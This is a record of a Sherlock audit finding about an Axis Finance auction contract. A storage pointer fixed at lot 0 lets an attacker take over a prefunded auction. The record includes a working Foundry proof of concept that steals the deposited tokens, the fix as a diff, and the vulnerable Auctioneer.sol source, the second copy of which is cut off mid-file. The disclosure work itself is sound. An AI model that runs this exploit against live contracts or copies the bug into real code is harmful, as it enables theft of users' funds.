{
  "Title": "H-1: Malicious user can overtake a prefunded auction and steal the deposited funds",
  "Content": "# Issue H-1: Malicious user can overtake a prefunded auction and steal the deposited funds \n\nSource: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/12 \n\n## Found by \n0xLogos, 0xboriskataa, 404666, 404Notfound, AgileJune, Bauer, Honour, JohnSmith, KiroBrejka, Kose, audithare, bhilare\\_, cu5t0mPe0, devblixt, dimulski, dinkras, ether\\_sky, flacko, hash, hulkvision, jecikpo, joicygiore, lemonmon, luxurioussauce, merlin, nine9, novaman33, petro1912, poslednaya, radin200, seeques, shaka, sl1, underdog\n## Summary\nIn the auction house whenever a new auction (lot) is created, its details are recorded at the 0th index in the `lotRouting` mapping. This allows for an attacker to create an auction right after an honest user and take over their auction, allowing them to steal funds in the case of a prefunded auction.\n\n## Vulnerability Detail\nWhen a new auction is created via [AuctionHouse#auction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164), it's routing details are recorded directly in storage at `lotRouting[lotId]` where `lotId` is the return value of the `auction()` function itself. Since the return value is declared as a variable at the function signature level, it is initialized with the value of `0`.\n\nThis means that when the `routing` [storage variable is declared](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174) (`Routing storage routing = lotRouting[lotId];`) it will always point to `lotRouting[0]` as the value of `lotId` is set a bit later in the `auction()` function to the correct index. This itself leads to the issue that an honest user can create a prefunded auction and an attacker can then come in, create a new auction themselves that is not prefunded and be immediately entitled to the honest user's prefunded funds by cancelling the auction they've just created as they're set as the `seller` of the lot at `lotRouting[0]`.\n\nThis attack is also possible because the `funding` attribute of a lot is only set if an auction is specified to be prefunded in its parameters at creation.\n## Impact\nThe following POC demonstrates how an attacker can overtake an honest user's auction and steal the funds they've pre-deposited. The attacker only needs to ensure the base token of the malicious auction they are creating is the same as the one of the auction of the honest user. Once that's done, the attacker only needs to cancel the auction and the funds will be transferred to them.\n\nTo run the POC just create a file `AuctionHouseTest.t.sol` somewhere under the `./moonraker/test` directory, add `src=/src/` to **remappings.txt** and run it using `forge test --match-test test_overtake_auction_and_steal_prefunded_funds`.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.19;\n\n// Libraries\nimport {Test} from \"forge-std/Test.sol\";\nimport {ERC20} from 'solmate/tokens/ERC20.sol';\n\nimport 'src/modules/Modules.sol';\nimport {Auction} from 'src/modules/Auction.sol';\n\nimport {AuctionHouse} from 'src/AuctionHouse.sol';\nimport {FixedPriceAuctionModule} from 'src/modules/auctions/FPAM.sol';\n\ncontract AuctionHouseTest is Test {\n  AuctionHouse public auctionHouse;\n  FixedPriceAuctionModule public fixedPriceAuctionModule;\n\n  address public OWNER = makeAddr('Owner');\n  address public PROTOCOL = makeAddr('Protocol');\n  address public PERMIT2 = makeAddr('Permit 2');\n\n  MockERC20 public baseToken = new MockERC20(\"Base\", \"BASE\", 18);\n  MockERC20 public quoteToken = new MockERC20(\"Quote\", \"QUOTE\", 18);\n\n  function setUp() public {\n    vm.warp(1710965574);\n    auctionHouse = new AuctionHouse(OWNER, PROTOCOL, PERMIT2);\n    fixedPriceAuctionModule = new FixedPriceAuctionModule(address(auctionHouse));\n\n    vm.prank(OWNER);\n    auctionHouse.installModule(fixedPriceAuctionModule);\n  }\n\n  function test_overtake_auction_and_steal_prefunded_funds() public {\n    // Step 1\n    uint256 PREFUNDED_AMOUNT = 1_000e18;\n    address USER = makeAddr('User');\n    vm.startPrank(USER);\n    baseToken.mint(PREFUNDED_AMOUNT);\n    baseToken.approve(address(auctionHouse), PREFUNDED_AMOUNT);\n\n    AuctionHouse.RoutingParams memory routingParams;\n    routingParams.auctionType = keycodeFromVeecode(fixedPriceAuctionModule.VEECODE());\n    routingParams.baseToken = baseToken;\n    routingParams.quoteToken = quoteToken;\n    routingParams.prefunded = true;\n\n    Auction.AuctionParams memory auctionParams;\n    auctionParams.start = uint48(block.timestamp + 1 weeks);\n    auctionParams.duration = 5 days;\n    auctionParams.capacity = uint96(PREFUNDED_AMOUNT);\n    auctionParams.implParams =\n      abi.encode(FixedPriceAuctionModule.FixedPriceParams({price: 1e18, maxPayoutPercent: 100_000}));\n\n    auctionHouse.auction(routingParams, auctionParams, \"\");\n\n    // Step 2\n    address ATTACKER = makeAddr('Attacker');\n    vm.startPrank(ATTACKER);\n\n    routingParams.prefunded = false;\n    auctionHouse.auction(routingParams, auctionParams, \"\");\n\t\n    // ATTACKER is now the seller of the lot at lotRouting[0]; the lot's funding remains the same\n    auctionHouse.cancel(0, \"\");\n\n    assertEq(baseToken.balanceOf(ATTACKER), PREFUNDED_AMOUNT);\n    assertEq(baseToken.balanceOf(USER), 0);\n  }\n}\n\ncontract MockERC20 is ERC20 {\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) ERC20(_name, _symbol, _decimals) {}\n\n    function mint(uint256 amount) public {\n      _mint(msg.sender, amount);\n    }\n}\n```\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164\nhttps://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174\nhttps://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L194\nhttps://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L211-L212\n## Tool used\nManual Review\nFoundry Forge\n\n## Recommendation\n```diff\ndiff --git a/moonraker/src/bases/Auctioneer.sol b/moonraker/src/bases/Auctioneer.sol\nindex a77585b..48c39d5 100644\n--- a/moonraker/src/bases/Auctioneer.sol\n+++ b/moonraker/src/bases/Auctioneer.sol\n@@ -171,6 +171,9 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {\n             revert InvalidParams();\n         }\n \n+        // Increment lot count and get ID\n+        lotId = lotCounter++;\n+\n         Routing storage routing = lotRouting[lotId];\n \n         bool requiresPrefunding;\n@@ -190,9 +193,6 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {\n                     || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18\n             ) revert InvalidParams();\n \n-            // Increment lot count and get ID\n-            lotId = lotCounter++;\n-\n             // Call module auction function to store implementation-specific data\n             (lotCapacity) =\n                 auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/Axis-Fi/moonraker/pull/132\n\n\n**10xhash**\n\n> The protocol team fixed this issue in the following PRs/commits: [Axis-Fi/moonraker#132](https://github.com/Axis-Fi/moonraker/pull/132)\n\nFixed\nLatest lotId is read before usage\n\n**sherlock-admin4**\n\nThe Lead Senior Watson signed off on the fix.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/206",
  "Code": [
    {
      "filename": "moonraker/src/bases/Auctioneer.sol",
      "content": "/// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {ERC20} from \"lib/solmate/src/tokens/ERC20.sol\";\nimport {Transfer} from \"src/lib/Transfer.sol\";\nimport {ReentrancyGuard} from \"lib/solmate/src/utils/ReentrancyGuard.sol\";\n\nimport {fromKeycode, Keycode, Veecode, Module, WithModules} from \"src/modules/Modules.sol\";\n\nimport {Auction, AuctionModule} from \"src/modules/Auction.sol\";\n\nimport {DerivativeModule} from \"src/modules/Derivative.sol\";\n\nimport {ICallback} from \"src/interfaces/ICallback.sol\";\nimport {Callbacks} from \"src/lib/Callbacks.sol\";\n\n/// @title  Auctioneer\n/// @notice The Auctioneer handles the following:\n///         - Creating new auction lots\n///         - Cancelling auction lots\n///         - Storing information about how to handle inputs and outputs for auctions (\"routing\")\nabstract contract Auctioneer is WithModules, ReentrancyGuard {\n    using Callbacks for ICallback;\n\n    // ========= ERRORS ========= //\n\n    error InvalidParams();\n    error InvalidLotId(uint96 id_);\n    error InvalidState();\n    error InvalidCallback();\n\n    /// @notice     Used when the caller is not permitted to perform that action\n    error NotPermitted(address caller_);\n\n    // ========= EVENTS ========= //\n\n    /// @notice         Emitted when a new auction lot is created\n    ///\n    /// @param          lotId       ID of the auction lot\n    /// @param          auctionRef  Auction module, represented by its Veecode\n    /// @param          infoHash    IPFS hash of the auction information\n    event AuctionCreated(uint96 indexed lotId, Veecode indexed auctionRef, string infoHash);\n\n    /// @notice         Emitted when an auction lot is cancelled\n    ///\n    /// @param          lotId       ID of the auction lot\n    /// @param          auctionRef  Auction module, represented by its Veecode\n    event AuctionCancelled(uint96 indexed lotId, Veecode indexed auctionRef);\n\n    /// @notice         Emitted when a curator accepts curation of an auction lot\n    ///\n    /// @param          lotId       ID of the auction lot\n    /// @param          curator     Address of the curator\n    event Curated(uint96 indexed lotId, address indexed curator);\n\n    // ========= DATA STRUCTURES ========== //\n\n    /// @notice     Auction routing information for a lot\n    ///\n    /// @param      auctionReference    Auction module, represented by its Veecode\n    /// @param      seller              Lot seller\n    /// @param      baseToken           Token provided by seller\n    /// @param      quoteToken          Token to accept as payment\n    /// @param      callbacks           (optional) Callbacks implementation for extended functionality\n    /// @param      derivativeReference (optional) Derivative module, represented by its Veecode\n    /// @param      derivativeParams    (optional) abi-encoded data to be used to create payout derivatives on a purchase\n    /// @param      wrapDerivative      (optional) Whether to wrap the derivative in a ERC20 token instead of the native ERC6909 format\n    /// @param      funding             The amount of base tokens in funding remaining\n    struct Routing {\n        address seller; // 20 bytes\n        uint96 funding; // 12 bytes\n        ERC20 baseToken; // 20 bytes\n        Veecode auctionReference; // 7 bytes\n        ERC20 quoteToken; // 20 bytes\n        ICallback callbacks; // 20 bytes\n        Veecode derivativeReference; // 7 bytes\n        bool wrapDerivative; // 1 byte\n        bytes derivativeParams;\n    }\n\n    /// @notice     Fee information for a lot\n    /// @dev        This is split into a separate struct, otherwise the Routing struct would be too large\n    ///             and would throw a \"stack too deep\" error.\n    ///\n    ///             The curator information is stored when curation is approved by the curator.\n    ///             The protocol and referrer fees are set at the time of lot settlement.\n    ///             The fees are cached in order to prevent:\n    ///             - Reducing the amount of base tokens available for payout to the winning bidders\n    ///             - Reducing the amount of quote tokens available for payment to the seller\n    ///\n    /// @param      curator     Address of the proposed curator\n    /// @param      curated     Whether the curator has approved the auction\n    /// @param      curatorFee  The fee charged by the curator\n    /// @param      protocolFee The fee charged by the protocol\n    /// @param      referrerFee The fee charged by the referrer\n    struct FeeData {\n        address curator; // 20 bytes\n        bool curated; // 1 byte\n        uint48 curatorFee; // 6 bytes\n        uint48 protocolFee; // 6 bytes\n        uint48 referrerFee; // 6 bytes\n    }\n\n    /// @notice     Auction routing information provided as input parameters\n    /// @dev        After validation, this information is stored in the Routing struct\n    ///\n    /// @param      auctionType         Auction type, represented by the Keycode for the auction submodule\n    /// @param      baseToken           Token provided by seller\n    /// @param      quoteToken          Token to accept as payment\n    /// @param      curator             (optional) Address of the proposed curator\n    /// @param      callbacks           (optional) Callbacks implementation for extended functionality\n    /// @param      callbackData        (optional) abi-encoded data to be sent to the onCreate callback function\n    /// @param      derivativeType      (optional) Derivative type, represented by the Keycode for the derivative submodule\n    /// @param      derivativeParams    (optional) abi-encoded data to be used to create payout derivatives on a purchase. The format of this is dependent on the derivative module.\n    /// @param      prefunded           Whether the auction should be pre-funded. Must be true for batch auctions.\n    struct RoutingParams {\n        Keycode auctionType;\n        ERC20 baseToken;\n        ERC20 quoteToken;\n        address curator;\n        ICallback callbacks;\n        bytes callbackData;\n        Keycode derivativeType;\n        bytes derivativeParams;\n        bool wrapDerivative;\n        bool prefunded;\n    }\n\n    // ========= STATE ========== //\n\n    /// @notice     Counter for auction lots\n    uint96 public lotCounter;\n\n    /// @notice     Mapping of lot IDs to their auction type (represented by the Keycode for the auction submodule)\n    mapping(uint96 lotId => Routing) public lotRouting;\n\n    /// @notice     Mapping of lot IDs to their fee information\n    mapping(uint96 lotId => FeeData) public lotFees;\n\n    // ========== AUCTION MANAGEMENT ========== //\n\n    /// @notice     Creates a new auction lot\n    /// @dev        The function reverts if:\n    ///             - The module for the auction type is not installed\n    ///             - The auction type is sunset\n    ///             - The base token or quote token decimals are not within the required range\n    ///             - The value of `RoutingParams.prefunded` is incorrect for the auction type\n    ///             - Validation for the auction parameters fails\n    ///             - The module for the optional specified derivative type is not installed\n    ///             - Validation for the optional specified derivative type fails\n    ///             - Registration for the optional allowlist fails\n    ///             - The optional specified hooks contract is not a contract\n    ///             - The condenser module is not installed or is sunset\n    ///             - re-entrancy is detected\n    ///\n    /// @param      routing_    Routing information for the auction lot\n    /// @param      params_     Auction parameters for the auction lot\n    /// @param      infoHash_   IPFS hash of the auction information\n    /// @return     lotId       ID of the auction lot\n    function auction(\n        RoutingParams calldata routing_,\n        Auction.AuctionParams calldata params_,\n        string calldata infoHash_\n    ) external nonReentrant returns (uint96 lotId) {\n        // Check that the module for the auction type is valid\n        // Validate routing parameters\n\n        // Tokens must not be the zero address\n        if (address(routing_.baseToken) == address(0) || address(routing_.quoteToken) == address(0))\n        {\n            revert InvalidParams();\n        }\n\n        Routing storage routing = lotRouting[lotId];\n\n        bool requiresPrefunding;\n        uint96 lotCapacity;\n        {\n            // Load auction type module, this checks that it is installed.\n            // We load it here vs. later to avoid two checks.\n            AuctionModule auctionModule =\n                AuctionModule(_getLatestModuleIfActive(routing_.auctionType));\n\n            // Confirm tokens are within the required decimal range\n            uint8 baseTokenDecimals = routing_.baseToken.decimals();\n            uint8 quoteTokenDecimals = routing_.quoteToken.decimals();\n\n            if (\n                auctionModule.TYPE() != Module.Type.Auction || baseTokenDecimals < 6\n                    || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18\n            ) revert InvalidParams();\n\n            // Increment lot count and get ID\n            lotId = lotCounter++;\n\n            // Call module auction function to store implementation-specific data\n            (lotCapacity) =\n                auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);\n            routing.auctionReference = auctionModule.VEECODE();\n\n            // Prefunding is required for batch auctions\n            // Check that this is not incorrectly overridden\n            if (auctionModule.auctionType() == Auction.AuctionType.Batch && !routing_.prefunded) {\n                revert InvalidParams();\n            }\n\n            requiresPrefunding = routing_.prefunded;\n        }\n\n        // Store routing information\n        routing.seller = msg.sender;\n        routing.baseToken = routing_.baseToken;\n        routing.quoteToken = routing_.quoteToken;\n\n        // Store curation information\n        {\n            FeeData storage fees = lotFees[lotId];\n            fees.curator = routing_.curator;\n            fees.curated = false;\n        }\n\n        // Derivative\n        if (fromKeycode(routing_.derivativeType) != bytes5(\"\")) {\n            // Load derivative module, this checks that it is installed.\n            DerivativeModule derivativeModule =\n                DerivativeModule(_getLatestModuleIfActive(routing_.derivativeType));\n\n            // Check that the module for the derivative type is valid\n            // Call module validate function to validate implementation-specific data\n            if (\n                derivativeModule.TYPE() != Module.Type.Derivative\n                    || !derivativeModule.validate(address(routing.baseToken), routing_.derivativeParams)\n            ) {\n                revert InvalidParams();\n            }\n\n            // Store derivative information\n            routing.derivativeReference = derivativeModule.VEECODE();\n            routing.derivativeParams = routing_.derivativeParams;\n            routing.wrapDerivative = routing_.wrapDerivative;\n        }\n\n        // Validate callbacks address and store if provided\n        // This does not check whether the callbacks contract is implemented properly\n        // Certain functions may revert later. TODO need to think about security with this.\n        if (!Callbacks.isValidCallbacksAddress(routing_.callbacks)) revert InvalidParams();\n        // The zero address passes the isValidCallbackAddress check since we allow auctions to not use a callbacks contract\n        if (address(routing_.callbacks) != address(0)) routing.callbacks = routing_.callbacks;\n\n        // Perform pre-funding, if needed\n        // It does not make sense to pre-fund the auction if the capacity is in quote tokens\n        if (requiresPrefunding == true) {\n            // Capacity must be in base token for auctions that require pre-funding\n            if (params_.capacityInQuote) revert InvalidParams();\n\n            // Store pre-funding information\n            routing.funding = lotCapacity;\n\n            // Handle funding from callback or seller as configured\n            if (routing_.callbacks.hasPermission(Callbacks.SEND_BASE_TOKENS_FLAG)) {\n                uint256 balanceBefore = routing_.baseToken.balanceOf(address(this));\n\n                // The onCreate callback should transfer the base token to this contract\n                _onCreateCallback(routing_, lotId, lotCapacity, true);\n\n                // Check that the hook transferred the expected amount of base tokens\n                if (routing_.baseToken.balanceOf(address(this)) < balanceBefore + lotCapacity) {\n                    revert InvalidCallback();\n                }\n            }\n            // Otherwise fallback to a standard ERC20 transfer and then call the onCreate callback\n            else {\n                Transfer.transferFrom(\n                    routing_.baseToken, msg.sender, address(this), lotCapacity, true\n                );\n                _onCreateCallback(routing_, lotId, lotCapacity, false);\n            }\n        } else {\n            // Call onCreate callback with no prefunding\n            _onCreateCallback(routing_, lotId, lotCapacity, false);\n        }\n\n        emit AuctionCreated(lotId, routing.auctionReference, infoHash_);\n    }\n\n    /// @notice     Cancels an auction lot\n    /// @dev        This function performs the following:\n    ///             - Checks that the lot ID is valid\n    ///             - Checks that caller is the seller\n    ///             - Calls the auction module to validate state, update records and determine the amount to be refunded\n    ///             - If prefunded, sends the refund of payout tokens to the seller\n    ///\n    ///             The function reverts if:\n    ///             - The lot ID is invalid\n    ///             - The caller is not the seller\n    ///             - The respective auction module reverts\n    ///             - The transfer of payout tokens fails\n    ///             - re-entrancy is detected\n    ///\n    /// @param      lotId_      ID of the auction lot\n    function cancel(uint96 lotId_, bytes calldata callbackData_) external nonReentrant {\n        // Validation\n        _isLotValid(lotId_);\n\n        Routing storage routing = lotRouting[lotId_];\n\n        // Check ownership\n        if (msg.sender != routing.seller) revert NotPermitted(msg.sender);\n\n        // Cancel the auction on the module\n        _getModuleForId(lotId_).cancelAuction(lotId_);\n\n        // If the auction is prefunded and supported, transfer the remaining capacity to the seller\n        if (routing.funding > 0) {\n            uint96 funding = routing.funding;\n\n            // Set to 0 before transfer to avoid re-entrancy\n            routing.funding = 0;\n\n            // Transfer the base tokens to the appropriate contract\n            Transfer.transfer(\n                routing.baseToken,\n                _getAddressGivenCallbackBaseTokenFlag(routing.callbacks, routing.seller),\n                funding,\n                false\n            );\n\n            // Call the callback to transfer the base token to the owner\n            Callbacks.onCancel(\n                routing.callbacks,\n                lotId_,\n                funding,\n                routing.callbacks.hasPermission(Callbacks.SEND_BASE_TOKENS_FLAG),\n                callbackData_\n            );\n        } else {\n            // Call the callback to notify of the cancellation\n            Callbacks.onCancel(routing.callbacks, lotId_, 0, false, callbackData_);\n        }\n\n        emit AuctionCancelled(lotId_, routing.auctionReference);\n    }\n\n    // ========== INTERNAL HELPER FUNCTIONS ========== //\n\n    /// @notice         Gets the module for a given lot ID\n    /// @dev            The function assumes:\n    ///                 - The lot ID is valid\n    ///\n    /// @param lotId_   ID of the auction lot\n    /// @return         AuctionModule\n    function _getModuleForId(uint96 lotId_) internal view returns (AuctionModule) {\n        // Load module, will revert if not installed\n        return AuctionModule(_getModuleIfInstalled(lotRouting[lotId_].auctionReference));\n    }\n\n    /// @notice     Gets the module for a given lot ID\n    /// @dev        The function reverts if:\n    ///             - The lot ID is invalid\n    ///             - The module for the auction type is not installed\n    ///\n    /// @param      lotId_      ID of the auction lot\n    function getModuleForId(uint96 lotId_) external view returns (AuctionModule) {\n        _isLotValid(lotId_);\n\n        return _getModuleForId(lotId_);\n    }\n\n    function _onCreateCallback(\n        RoutingParams calldata routing_,\n        uint96 lotId_,\n        uint96 capacity_,\n        bool preFund_\n    ) internal {\n        Callbacks.onCreate(\n            routing_.callbacks,\n            lotId_,\n            msg.sender,\n            address(routing_.baseToken),\n            address(routing_.quoteToken),\n            capacity_,\n            preFund_,\n            routing_.callbackData\n        );\n    }\n\n    function _getAddressGivenCallbackBaseTokenFlag(\n        ICallback callbacks_,\n        address seller_\n    ) internal pure returns (address) {\n        return callbacks_.hasPermission(Callbacks.SEND_BASE_TOKENS_FLAG)\n            ? address(callbacks_)\n            : seller_;\n    }\n\n    // ========= VALIDATION FUNCTIONS ========= //\n\n    /// @notice     Checks that the lot ID is valid\n    /// @dev        Reverts if the lot ID is invalid\n    ///\n    /// @param      lotId_  ID of the auction lot\n    function _isLotValid(uint96 lotId_) internal view {\n        if (lotId_ >= lotCounter) revert InvalidLotId(lotId_);\n    }\n}"
    },
    {
      "filename": "moonraker/src/bases/Auctioneer.sol",
      "content": "/// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {ERC20} from \"lib/solmate/src/tokens/ERC20.sol\";\nimport {Transfer} from \"src/lib/Transfer.sol\";\nimport {ReentrancyGuard} from \"lib/solmate/src/utils/ReentrancyGuard.sol\";\n\nimport {fromKeycode, Keycode, Veecode, Module, WithModules} from \"src/modules/Modules.sol\";\n\nimport {Auction, AuctionModule} from \"src/modules/Auction.sol\";\n\nimport {DerivativeModule} from \"src/modules/Derivative.sol\";\n\nimport {ICallback} from \"src/interfaces/ICallback.sol\";\nimport {Callbacks} from \"src/lib/Callbacks.sol\";\n\n/// @title  Auctioneer\n/// @notice The Auctioneer handles the following:\n///         - Creating new auction lots\n///         - Cancelling auction lots\n///         - Storing information about how to handle inputs and outputs for auctions (\"routing\")\nabstract contract Auctioneer is WithModules, ReentrancyGuard {\n    using Callbacks for ICallback;\n\n    // ========= ERRORS ========= //\n\n    error InvalidParams();\n    error InvalidLotId(uint96 id_);\n    error InvalidState();\n    error InvalidCallback();\n\n    /// @notice     Used when the caller is not permitted to perform that action\n    error NotPermitted(address caller_);\n\n    // ========= EVENTS ========= //\n\n    /// @notice         Emitted when a new auction lot is created\n    ///\n    /// @param          lotId       ID of the auction lot\n    /// @param          auctionRef  Auction module, represented by its Veecode\n    /// @param          infoHash    IPFS hash of the auction information\n    event AuctionCreated(uint96 indexed lotId, Veecode indexed auctionRef, string infoHash);\n\n    /// @notice         Emitted when an auction lot is cancelled\n    ///\n    /// @param          lotId       ID of the auction lot\n    /// @param          auctionRef  Auction module, represented by its Veecode\n    event AuctionCancelled(uint96 indexed lotId, Veecode indexed auctionRef);\n\n    /// @notice         Emitted when a curator accepts curation of an auction lot\n    ///\n    /// @param          lotId       ID of the auction lot\n    /// @param          curator     Address of the curator\n    event Curated(uint96 indexed lotId, address indexed curator);\n\n    // ========= DATA STRUCTURES ========== //\n\n    /// @notice     Auction routing information for a lot\n    ///\n    /// @param      auctionReference    Auction module, represented by its Veecode\n    /// @param      seller              Lot seller\n    /// @param      baseToken           Token provided by seller\n    /// @param      quoteToken          Token to accept as payment\n    /// @param      callbacks           (optional) Callbacks implementation for extended functionality\n    /// @param      derivativeReference (optional) Derivative module, represented by its Veecode\n    /// @param      derivativeParams    (optional) abi-encoded data to be used to create payout derivatives on a purchase\n    /// @param      wrapDerivative      (optional) Whether to wrap the derivative in a ERC20 token instead of the native ERC6909 format\n    /// @param      funding             The amount of base tokens in funding remaining\n    struct Routing {\n        address seller; // 20 bytes\n        uint96 funding; // 12 bytes\n        ERC20 baseToken; // 20 bytes\n        Veecode auctionReference; // 7 bytes\n        ERC20 quoteToken; // 20 bytes\n        ICallback callbacks; // 20 bytes\n        Veecode derivativeReference; // 7 bytes\n        bool wrapDerivative; // 1 byte\n        bytes derivativeParams;\n    }\n\n    /// @notice     Fee information for a lot\n    /// @dev        This is split into a separate struct, otherwise the Routing struct would be too large\n    ///             and would throw a \"stack too deep\" error.\n    ///\n    ///             The curator information is stored when curation is approved by the curator.\n    ///             The protocol and referrer fees are set at the time of lot settlement.\n    ///             The fees are cached in order to prevent:\n    ///             - Reducing the amount of base tokens available for payout to the winning bidders\n    ///             - Reducing the amount of quote tokens available for payment to the seller\n    ///\n    /// @param      curator     Address of the proposed curator\n    /// @param      curated     Whether the curator has approved the auction\n    /// @param      curatorFee  The fee charged by the curator\n    /// @param      protocolFee The fee charged by the protocol\n    /// @param      referrerFee The fee charged by the referrer\n    struct FeeData {\n        address curator; // 20 bytes\n        bool curated; // 1 byte\n        uint48 curatorFee; // 6 bytes\n        uint48 protocolFee; // 6 bytes\n        uint48 referrerFee; // 6 bytes\n    }\n\n    /// @notice     Auction routing information provided as input parameters\n    /// @dev        After validation, this information is stored in the Routing struct\n    ///\n    /// @param      auctionType         Auction type, represented by the Keycode for the auction submodule\n    /// @param      baseToken           Token provided by seller\n    /// @param      quoteToken          Token to accept as payment\n    /// @param      curator             (optional) Address of the proposed curator\n    /// @param      callbacks           (optional) Callbacks implementation for extended functionality\n    /// @param      callbackData        (optional) abi-encoded data to be sent to the onCreate callback function\n    /// @param      derivativeType      (optional) Derivative type, represented by the Keycode for the derivative submodule\n    /// @param      derivativeParams    (optional) abi-encoded data to be used to create payout derivatives on a purchase. The format of this is dependent on the derivative module.\n    /// @param      prefunded           Whether the auction should be pre-funded. Must be true for batch auctions.\n    struct RoutingParams {\n        Keycode auctionType;\n        ERC20 baseToken;\n        ERC20 quoteToken;\n        address curator;\n        ICallback callbacks;\n        bytes callbackData;\n        Keycode derivativeType;\n        bytes derivativeParams;\n        bool wrapDerivative;\n        bool prefunded;\n    }\n\n    // ========= STATE ========== //\n\n    /// @notice     Counter for auction lots\n    uint96 public lotCounter;\n\n    /// @notice     Mapping of lot IDs to their auction type (represented by the Keycode for the auction submodule)\n    mapping(uint96 lotId => Routing) public lotRouting;\n\n    /// @notice     Mapping of lot IDs to their fee information\n    mapping(uint96 lotId => FeeData) public lotFees;\n\n    // ========== AUCTION MANAGEMENT ========== //\n\n    /// @notice     Creates a new auction lot\n    /// @dev        The function reverts if:\n    ///             - The module for the auction type is not installed\n    ///             - The auction type is sunset\n    ///             - The base token or quote token decimals are not within the required range\n    ///             - The value of `RoutingParams.prefunded` is incorrect for the auction type\n    ///             - Validation for the auction parameters fails\n    ///             - The module for the optional specified derivative type is not installed\n    ///             - Validation for the optional specified derivative type fails\n    ///             - Registration for the optional allowlist fails\n    ///             - The optional specified hooks contract is not a contract\n    ///             - The condenser module is not installed or is sunset\n    ///             - re-entrancy is detected\n    ///\n    /// @param      routing_    Routing information for the auction lot\n    /// @param      params_     Auction parameters for the auction lot\n    /// @param      infoHash_   IPFS hash of the auction information\n    /// @return     lotId       ID of the auction lot\n    function auction(\n        RoutingParams calldata routing_,\n        Auction.AuctionParams calldata params_,\n        string calldata infoHash_\n    ) external nonReentrant returns (uint96 lotId) {\n        // Check that the module for the auction type is valid\n        // Validate routing parameters\n\n        // Tokens must not be the zero address\n        if (address(routing_.baseToken) == address(0) || address(routing_.quoteToken) == address(0))\n        {\n            revert InvalidParams();\n        }\n\n        Routing storage routing = lotRouting[lotId];\n\n        bool requiresPrefunding;\n        uint96 lotCapacity;\n        {\n            // Load auction type module, this checks that it is installed.\n            // We load it here vs. later to avoid two checks.\n            AuctionModule auctionModule =\n                AuctionModule(_getLatestModuleIfActive(routing_.auctionType));\n\n            // Confirm tokens are within the required decimal range\n            uint8 baseTokenDecimals = routing_.baseToken.decimals();\n            uint8 quoteTokenDecimals = routing_.quoteToken.decimals();\n\n            if (\n                auctionModule.TYPE() != Module.Type.Auction || baseTokenDecimals < 6\n                    || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18\n            ) revert InvalidParams();\n\n            // Increment lot count and get ID\n            lotId = lotCounter++;\n\n            // Call module auction function to store implementation-specific data\n            (lotCapacity) =\n                auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);\n            routing.auctionReference = auctionModule.VEECODE();\n\n            // Prefunding is required for batch auctions\n            // Check that this is not incorrectly overridden\n            if (auctionModule.auctionType() == Auction.AuctionType.Batch && !routing_.prefunded) {\n                revert InvalidParams();\n            }\n\n            requiresPrefunding = routing_.prefunded;\n        }\n\n        // Store routing information\n        routing.seller = msg.sender;\n        routing.baseToken = routing_.baseToken;\n        routing.quoteToken = routing_.quoteToken;\n\n        // Store curation information\n        {\n            FeeData storage fees = lotFees[lotId];\n            fees.curator = routing_.curator;\n            fees.curated = false;\n        }\n\n        // Derivative\n        if (fromKeycode(routing_.derivativeType) != bytes5(\"\")) {\n            // Load derivative module, this checks that it is installed.\n            DerivativeModule derivativeModule =\n                DerivativeModule(_getLatestModuleIfActive(routing_.derivativeType));\n\n            // Check that the module for the derivative type is valid\n            // Call module validate function to validate implementation-specific data\n            if (\n                derivativeModule.TYPE() != Module.Type.Derivative\n                    || !derivativeModule.validate(address(routing.baseToken), routing_.derivativeParams)\n            ) {\n                revert InvalidParams();\n            }\n\n            // Store derivative information\n            routing.derivativeReference = derivativeModule.VEECODE();\n            routing.derivativeParams = routing_.derivativeParams;\n            routing.wrapDerivative = routing_.wrapDerivative;\n        }\n\n        // Validate callbacks address and store if provided\n        // This does not check whether the callbacks contract is implemented properly\n        // Certain functions may revert later. TODO need to think about security with this.\n        if (!Callbacks.isValidCallbacksAddress(routing_.callbacks)) revert InvalidParams();\n        // The zero address passes the isValidCallbackAddress check since we allow auctions to not use a callbacks contract\n        if (address(routing_.callbacks) != address(0)) routing.callbacks = routing_.callbacks;\n\n        // Perform pre-funding, if needed\n        // It does not make sense to pre-fund the auction if the capacity is in quote tokens\n        if (requiresPrefunding == true) {\n            // Capacity must be in base token for auctions that require pre-funding\n            if (params_.capacityInQuote) revert InvalidParams();\n\n            // Store pre-funding information\n            routing.funding = lotCapacity;\n\n            // Handle funding from callback or seller as configured\n            if (routing_.callbacks.hasPermission(Callbacks.SEND_BASE_TOKENS_FLAG)) {\n                uint256 balanceBefore = routing_.baseToken.balanceOf(address(this));\n\n                // The onCreate callback should transfer the base token to this contract\n                _onCreateCallback(routing_, lotId, lotCapacity, true);\n\n                // Check that the hook transferred the expected amount of base tokens\n                if (routing_.baseToken.balanceOf(address(this)) < balanceBefore + lotCapacity) {\n                    revert InvalidCallback();\n                }\n            }\n            // Otherwise fallback to a 